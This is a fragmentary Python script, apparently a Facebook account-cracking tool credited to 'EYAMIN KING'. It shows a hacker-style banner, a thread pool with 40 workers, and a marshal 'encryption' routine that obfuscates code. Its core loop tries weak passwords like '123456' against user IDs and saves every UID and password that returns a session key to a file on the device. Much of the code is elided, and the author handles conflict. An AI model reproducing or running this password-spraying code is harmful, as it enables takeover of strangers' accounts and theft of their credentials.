...
#MAKE BYE EYAMIN 
#GITHUB : https://github.com/Eyamin007
#Whatsapp : 01600966366
#───────────────[ IMPORT SYSTEM ]─────────────────────────#
...
try:
        ...
        from string import *
        from concurrent.futures import ThreadPoolExecutor as EYAMIN
        from concurrent.futures import ThreadPoolExecutor as tred
...
\033[1;93m######   ##  ##     ##     ##   ##   ####    ##  ##  
 ...
 ##         ##     ##  ##   ##   ##    ##     ##  ##  
 ######     ##     ##  ##   ##   ##   ####    ##  ##  \033[1;93m
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m DEVELOPER   :  EYAMIN KING
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FACEBOOK    :  G H O S T 
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m GITHUB      :  EYAMIN3987
...
#       line()
       ...
       with EYAMIN(max_workers=40) as skber:
#           fresh()
           os.system('clear')
           print(logo)
...
def marshal_enc():
    ...
    out_put.write('#-------------------------------------##-------------------------------------#\n# ENCRYPTED BY : EYAMIN KING\n# GITHUB : https://github.com/EYAMIN3987\n#-------------------------------------##-------------------------------------#\n\n')
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
            ...
            if "session_key" in rp:
            	...
            	open("/sdcard/EYAMIN-2f.txt","a").write(uid+"|"+pw+"\n")
            	cps.append(uid)
            	break
            else:continue
        loop+=1
